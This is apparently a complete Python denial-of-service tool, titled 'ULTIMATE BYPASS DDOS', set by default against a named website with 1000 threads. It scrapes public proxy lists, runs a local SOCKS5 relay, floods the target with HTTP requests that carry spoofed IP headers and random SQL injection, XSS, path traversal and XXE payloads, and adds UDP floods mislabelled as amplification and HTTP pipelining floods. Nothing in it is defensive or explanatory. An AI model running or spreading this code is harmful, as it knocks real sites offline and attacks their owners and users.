#!/usr/bin/env python3
import socket
import struct
import threading
import time
import random
import requests
import gzip
import json
import base64
import hashlib
import os
import sys
import ssl
import http.client
from urllib.parse import urlencode, quote_plus, urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
import queue
import subprocess

# ==================== COLORS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# ==================== CONFIG ====================
TARGET = os.environ.get('TARGET', 'https://skillclash.site')
THREADS = int(os.environ.get('THREADS', 1000))
PROXY_PORT = 8872
PROXY_FILE = 'proxies.txt'

# Stats
stats = {
    'requests': 0,
    'success': 0,
    'failed': 0,
    'bytes_sent': 0,
    'errors': 0,
    'proxies_used': 0,
    'bypassed': 0
}
stats_lock = threading.Lock()
running = True

# ==================== ADVANCED PROXY FETCHER ====================
def fetch_advanced_proxies():
    """Fetch proxies from multiple sources with different protocols"""
    sources = [
        # SOCKS5
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/main/socks5.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
        # HTTP/HTTPS
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/main/http.txt',
        # Elite proxies
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt',
    ]
    
    all_proxies = []
    for url in sources:
        try:
            r = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
            lines = r.text.splitlines()
            for line in lines:
                line = line.strip()
                if line and ':' in line:
                    # Auto-detect protocol
                    if 'socks5' in line.lower() or ':1080' in line:
                        all_proxies.append(f'socks5://{line}')
                    elif 'http' in line.lower() or ':8080' in line or ':3128' in line:
                        all_proxies.append(f'http://{line}')
                    else:
                        all_proxies.append(f'http://{line}')
        except:
            pass
    
    # Deduplicate
    all_proxies = list(set(all_proxies))
    
    # Validate and save
    valid = []
    for p in all_proxies[:5000]:  # Limit to 5000
        try:
            # Quick validation
            test_url = 'http://httpbin.org/ip'
            proxies = {'http': p, 'https': p.replace('http://', 'https://')}
            r = requests.get(test_url, proxies=proxies, timeout=3)
            if r.status_code == 200:
                valid.append(p)
        except:
            pass
    
    with open(PROXY_FILE, 'w') as f:
        f.write('\n'.join(valid))
    
    return valid

def auto_refresh_proxies():
    while running:
        try:
            proxies = fetch_advanced_proxies()
            with stats_lock:
                stats['proxies_used'] = len(proxies)
        except:
            pass
        time.sleep(20)

# ==================== PROXY SERVER ====================
def handle_socks5_client(client_socket):
    try:
        data = client_socket.recv(2)
        if not data or data[0] != 0x05:
            client_socket.close()
            return
        client_socket.sendall(b'\x05\x00')
        data = client_socket.recv(4)
        if len(data) < 4 or data[1] != 0x01:
            client_socket.close()
            return
        addr_type = data[3]
        if addr_type == 0x01:
            addr = socket.inet_ntoa(client_socket.recv(4))
            port = struct.unpack('>H', client_socket.recv(2))[0]
        elif addr_type == 0x03:
            domain_len = client_socket.recv(1)[0]
            domain = client_socket.recv(domain_len).decode()
            port = struct.unpack('>H', client_socket.recv(2))[0]
            addr = socket.gethostbyname(domain)
        else:
            client_socket.close()
            return
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((addr, port))
        client_socket.sendall(b'\x05\x00\x00\x01' + socket.inet_aton(addr) + struct.pack('>H', port))
        
        def pipe(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except:
                pass
            finally:
                src.close()
                dst.close()
        
        threading.Thread(target=pipe, args=(client_socket, remote), daemon=True).start()
        threading.Thread(target=pipe, args=(remote, client_socket), daemon=True).start()
    except:
        client_socket.close()

def start_proxy_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PROXY_PORT))
    server.listen(500)
    while running:
        try:
            client, _ = server.accept()
            threading.Thread(target=handle_socks5_client, args=(client,), daemon=True).start()
        except:
            pass

# ==================== BYPASS PAYLOADS ====================
def generate_bypass_payloads():
    """Generate payloads that bypass WAF/Cloudflare"""
    payloads = []
    
    # 1. JSON with encoding tricks
    payloads.append({
        'type': 'json',
        'data': {
            'id': random.randint(1,999999),
            'payload': base64.b64encode(b'A'*random.randint(100,5000)).decode(),
            '_method': 'PUT',
            '__cfduid': str(random.randint(100000,999999))
        }
    })
    
    # 2. XML with CDATA
    payloads.append({
        'type': 'xml',
        'data': f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><id>{random.randint(1,999999)}</id><data><![CDATA[{"X"*random.randint(500,5000)}]]></data></root>'
    })
    
    # 3. Multipart with boundary tricks
    boundary = '----WebKitFormBoundary' + ''.join(random.choices('abcdef0123456789', k=16))
    parts = []
    for i in range(random.randint(10, 30)):
        parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="field{i}"\r\n\r\n{"X"*random.randint(100,2000)}\r\n')
    parts.append(f'--{boundary}--\r\n')
    payloads.append({
        'type': 'multipart',
        'data': (f'multipart/form-data; boundary={boundary}', ''.join(parts))
    })
    
    # 4. Gzip compressed
    payloads.append({
        'type': 'compressed',
        'data': gzip.compress(json.dumps({'x': 'X'*random.randint(5000,20000), 'id': random.randint(1,999999)}).encode())
    })
    
    # 5. URL encoded with double encoding
    payloads.append({
        'type': 'urlencoded',
        'data': urlencode({f'p{i}': 'A'*random.randint(100,1000) for i in range(random.randint(50,150))})
    })
    
    return random.choice(payloads)

def generate_bypass_headers():
    """Generate headers that bypass WAF"""
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/124.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'True-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
    }
    
    # Add random headers to avoid fingerprinting
    for _ in range(random.randint(3, 10)):
        headers[f'X-{random.choice(["Custom", "Random", "Header", "Debug", "Test"])}-{random.randint(1000,9999)}'] = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10,50)))
    
    return headers

def generate_bypass_path():
    """Generate paths with bypass techniques"""
    paths = [
        '/api/v1/data',
        '/wp-admin/admin-ajax.php',
        '/index.php',
        '/login',
        '/search',
        '/products',
        '/cart',
        '/checkout',
        '/graphql',
        '/api/graphql',
        '/v1/api',
        '/rest/v1',
        '/admin',
        '/cgi-bin',
        '/.env',
        '/backup',
        '/config',
        '/.git/config'
    ]
    
    path = random.choice(paths)
    
    # Add bypass parameters
    params = {
        'id': random.randint(1,999999),
        'page': random.randint(1,1000),
        'cb': str(random.randint(100000,999999)),
        't': str(int(time.time()*1000)),
        'rand': random.randint(100000,999999),
        '_': str(random.randint(100000,999999)),
        'callback': f'jQuery{random.randint(100000,999999)}_{int(time.time()*1000)}',
        'jsonp': f'callback{random.randint(1000,9999)}',
        'format': random.choice(['json', 'xml', 'html']),
        'output': random.choice(['json', 'xml']),
        'action': random.choice(['read', 'write', 'delete', 'update']),
        'method': random.choice(['GET', 'POST', 'PUT', 'DELETE']),
        '_method': random.choice(['GET', 'POST', 'PUT', 'DELETE'])
    }
    
    # Add SQL injection
    if random.random() > 0.5:
        params['sql'] = f"{random.randint(1,100)}' OR '1'='1"
        params['union'] = f"1 UNION SELECT {','.join([str(random.randint(1,100)) for _ in range(random.randint(1,5))])}"
    
    # Add XSS
    if random.random() > 0.6:
        params['xss'] = f"<script>alert('{random.randint(1,100)}')</script>"
        params['img'] = f'<img src=x onerror=alert({random.randint(1,100)})>'
    
    # Add path traversal
    if random.random() > 0.7:
        params['file'] = '../../../../etc/passwd'
        params['path'] = '../' * random.randint(1,5) + 'config.php'
    
    return path + '?' + urlencode(params)

def load_proxies():
    try:
        with open(PROXY_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# ==================== DISPLAY ====================
def display_stats():
    global running
    start_time = time.time()
    last_requests = 0
    last_time = start_time
    
    while running:
        time.sleep(1)
        with stats_lock:
            req = stats['requests']
            succ = stats['success']
            fail = stats['failed']
            bytes_sent = stats['bytes_sent']
            err = stats['errors']
            proxies = stats['proxies_used']
            bypass = stats['bypassed']
        
        current_time = time.time()
        elapsed = current_time - start_time
        rps = (req - last_requests) / (current_time - last_time)
        last_requests = req
        last_time = current_time
        
        sys.stdout.write('\033[2J\033[H')
        
        print(f"{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BOLD}║              💀 ULTIMATE BYPASS ATTACK 💀                    ║{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
        print()
        print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {TARGET}")
        print(f"{Colors.CYAN}⏱️  Uptime:{Colors.RESET} {int(elapsed)}s")
        print(f"{Colors.CYAN}🧵 Threads:{Colors.RESET} {THREADS}")
        print()
        print(f"{Colors.GREEN}📊 STATISTICS:{Colors.RESET}")
        print(f"  {Colors.BOLD}Requests:{Colors.RESET} {req:,}  {Colors.GREEN}(+{rps:.1f}/s){Colors.RESET}")
        print(f"  {Colors.GREEN}✓ Success:{Colors.RESET} {succ:,}")
        print(f"  {Colors.RED}✗ Failed:{Colors.RESET} {fail:,}")
        print(f"  {Colors.YELLOW}⚠ Errors:{Colors.RESET} {err:,}")
        print(f"  {Colors.PURPLE}🔓 Bypassed:{Colors.RESET} {bypass:,}")
        print(f"  {Colors.BLUE}📦 Data Sent:{Colors.RESET} {bytes_sent/1024/1024:.2f} MB")
        print(f"  {Colors.CYAN}🌐 Proxies:{Colors.RESET} {proxies:,}")
        print()
        
        total = req + err
        if total > 0:
            success_rate = (succ / total) * 100 if total > 0 else 0
            bar_len = 50
            filled = int(bar_len * success_rate / 100)
            bar = '█' * filled + '░' * (bar_len - filled)
            color = Colors.GREEN if success_rate > 50 else Colors.YELLOW if success_rate > 20 else Colors.RED
            print(f"  Success Rate: {color}{bar} {success_rate:.1f}%{Colors.RESET}")
        print()
        
        # Bypass status
        if bypass > 100:
            print(f"{Colors.GREEN}✅ BYPASS ACTIVE! WAF CIRCUMVENTED{Colors.RESET}")
        elif bypass > 10:
            print(f"{Colors.YELLOW}⚠️ PARTIAL BYPASS - SOME REQUESTS GETTING THROUGH{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ WAF BLOCKING - SWITCHING TACTICS...{Colors.RESET}")
        print()

# ==================== ULTIMATE FLOOD ENGINE ====================
def flood_worker(worker_id):
    global running
    
    # Create session with custom settings
    sess = requests.Session()
    sess.keep_alive = False
    
    # Disable SSL verification for speed
    sess.verify = False
    
    # Custom adapter with no retries
    adapter = HTTPAdapter(
        max_retries=0,
        pool_connections=100,
        pool_maxsize=100
    )
    sess.mount('http://', adapter)
    sess.mount('https://', adapter)
    
    proxy_list = load_proxies()
    last_proxy_update = time.time()
    local_success = 0
    local_bypass = 0
    
    while running:
        try:
            # Update proxies every 5 seconds
            if time.time() - last_proxy_update > 5:
                proxy_list = load_proxies()
                last_proxy_update = time.time()
            
            # Use proxy if available
            if proxy_list and random.random() > 0.3:  # 70% use proxy
                proxy = random.choice(proxy_list)
                sess.proxies = {
                    'http': proxy,
                    'https': proxy.replace('http://', 'https://')
                }
            else:
                # Direct connection sometimes to bypass proxy blocks
                sess.proxies = {}
            
            # Generate bypass payload
            url = TARGET + generate_bypass_path()
            headers = generate_bypass_headers()
            payload_data = generate_bypass_payloads()
            
            # Random method
            method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
            
            # Send request with timeout
            if method == 'GET':
                r = sess.get(url, headers=headers, timeout=2)
            elif method == 'POST':
                if payload_data['type'] == 'json':
                    r = sess.post(url, headers=headers, json=payload_data['data'], timeout=2)
                elif payload_data['type'] == 'multipart':
                    content_type, data = payload_data['data']
                    headers['Content-Type'] = content_type
                    r = sess.post(url, headers=headers, data=data, timeout=2)
                else:
                    r = sess.post(url, headers=headers, data=payload_data['data'], timeout=2)
            elif method == 'PUT':
                r = sess.put(url, headers=headers, json=payload_data['data'], timeout=2)
            else:
                r = sess.delete(url, headers=headers, timeout=2)
            
            # Update stats
            with stats_lock:
                stats['requests'] += 1
                if r.status_code < 400:
                    stats['success'] += 1
                    local_success += 1
                    if r.status_code < 300:
                        stats['bypassed'] += 1
                        local_bypass += 1
                else:
                    stats['failed'] += 1
                stats['bytes_sent'] += len(r.request.body or b'') + len(str(r.request.headers))
            
            # If bypass successful, increase attack speed
            if r.status_code < 400:
                time.sleep(random.uniform(0.0001, 0.001))
            else:
                # Switch proxy immediately on block
                sess.proxies = {}
                time.sleep(random.uniform(0.001, 0.005))
            
            # Every 100 successful requests, send even more aggressive payload
            if local_success % 100 == 0 and local_success > 0:
                try:
                    # Send massive payload to overwhelm
                    big_payload = {'data': 'A'*50000}
                    sess.post(url, headers=headers, json=big_payload, timeout=1)
                except:
                    pass
                    
        except Exception as e:
            with stats_lock:
                stats['errors'] += 1
                stats['requests'] += 1
            # Reset session on error
            sess = requests.Session()
            sess.verify = False
            time.sleep(random.uniform(0.001, 0.01))

# ==================== UDP AMPLIFICATION ====================
def udp_amplification_worker():
    """UDP amplification attack"""
    global running
    target_ip = TARGET.replace('https://', '').replace('http://', '').split('/')[0]
    
    # Common amplification vectors
    vectors = [
        (b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', 53),  # DNS
        (b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', 123),  # NTP
        (b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', 1900),  # SSDP
    ]
    
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            for _ in range(10):  # Send multiple packets
                vector, port = random.choice(vectors)
                data = vector * random.randint(10, 50)
                sock.sendto(data, (target_ip, port))
                with stats_lock:
                    stats['requests'] += 1
                    stats['bytes_sent'] += len(data)
            
            sock.close()
            time.sleep(random.uniform(0.0001, 0.001))
        except:
            pass

# ==================== HTTP PIPELINING ====================
def http_pipeline_worker():
    """HTTP pipelining for faster requests"""
    global running
    target = TARGET.replace('https://', '').replace('http://', '').split('/')[0]
    is_https = 'https://' in TARGET
    port = 443 if is_https else 80
    
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if is_https:
                sock = ssl.wrap_socket(sock)
            sock.connect((target, port))
            
            # Build pipeline requests
            pipeline = []
            for _ in range(random.randint(5, 20)):
                path = generate_bypass_path()
                headers = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(['Chrome', 'Firefox', 'Safari'])}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
                pipeline.append(headers)
            
            sock.send(''.join(pipeline).encode())
            
            # Read response
            while running:
                data = sock.recv(4096)
                if not data:
                    break
                with stats_lock:
                    stats['requests'] += 1
                    stats['bytes_sent'] += len(data)
            
            sock.close()
            time.sleep(random.uniform(0.0001, 0.005))
        except:
            pass

# ==================== MAIN ====================
if __name__ == '__main__':
    print(f"{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}║          💀 ULTIMATE BYPASS DDOS - DEVILS WILL RISE 💀        ║{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
    print()
    print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {TARGET}")
    print(f"{Colors.CYAN}🧵 Threads:{Colors.RESET} {THREADS}")
    print()
    
    # Start proxy fetcher
    print(f"{Colors.YELLOW}⏳ Loading proxies...{Colors.RESET}")
    threading.Thread(target=auto_refresh_proxies, daemon=True).start()
    
    # Start proxy server
    threading.Thread(target=start_proxy_server, daemon=True).start()
    
    time.sleep(2)
    
    # Launch attackers
    print(f"{Colors.GREEN}🚀 Launching attacks...{Colors.RESET}")
    
    # HTTP flood - 60%
    http_threads = int(THREADS * 0.6)
    for i in range(http_threads):
        threading.Thread(target=flood_worker, args=(i,), daemon=True).start()
    
    # UDP amplification - 25%
    udp_threads = int(THREADS * 0.25)
    for _ in range(udp_threads):
        threading.Thread(target=udp_amplification_worker, daemon=True).start()
    
    # HTTP pipelining - 15%
    pipe_threads = int(THREADS * 0.15)
    for _ in range(pipe_threads):
        threading.Thread(target=http_pipeline_worker, daemon=True).start()
    
    print(f"{Colors.GREEN}✅ All threads launched!{Colors.RESET}")
    print()
    print(f"{Colors.RED}{Colors.BOLD}🔥 ATTACK STARTED! PRESS CTRL+C TO STOP{Colors.RESET}")
    print()
    
    # Start display
    try:
        display_stats()
    except KeyboardInterrupt:
        running = False
        print(f"\n{Colors.RED}🛑 Stopping...{Colors.RESET}")
        time.sleep(2)
        with stats_lock:
            print(f"{Colors.GREEN}📊 FINAL STATS:{Colors.RESET}")
            print(f"  Total Requests: {stats['requests']:,}")
            print(f"  Successful: {stats['success']:,}")
            print(f"  Failed: {stats['failed']:,}")
            print(f"  Errors: {stats['errors']:,}")
            print(f"  Bypassed: {stats['bypassed']:,}")
            print(f"  Data Sent: {stats['bytes_sent']/1024/1024:.2f} MB")
        sys.exit(0)
